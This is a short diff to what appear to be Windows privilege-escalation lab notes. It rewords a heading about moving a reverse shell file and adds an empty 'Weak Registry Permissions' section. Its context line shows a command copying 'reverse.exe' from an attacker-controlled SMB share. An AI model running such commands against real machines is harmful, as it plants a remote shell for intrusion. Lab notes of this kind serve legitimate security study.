@@ -478,7 +478,7 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
      
      ---
      
-     ## 3. move the reverse shell to the new path with new name 
+     ## 3. move the reverse shell file to the new path with new name 
      
      
      ```ruby
@@ -527,8 +527,27 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 - <details>
-      <summary></summary>
+      <summary> Weak Registry Permissions</summary>
+
+
+
+
+
+
+
   </details>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 - <details>
